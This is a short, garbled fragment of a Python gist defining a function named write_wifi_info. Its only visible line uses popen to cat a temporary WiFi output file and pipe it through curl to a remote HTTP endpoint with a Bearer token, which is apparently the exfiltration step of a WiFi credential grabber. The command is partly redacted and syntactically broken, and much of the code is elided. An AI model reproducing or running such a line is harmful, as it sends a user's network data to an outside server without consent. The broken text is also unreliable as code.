#date: 2023-06-12T17:01:34Z
#url: https://api.github.com/gists/96c846cba346c1532894c9d52972dfa5
...
def write_wifi_info():
    ...
    result = popen("cat {} {} curl -vd \"@-\" http: "**********":Bearer {}".format(temp_wifi_out, vertical, b, token))
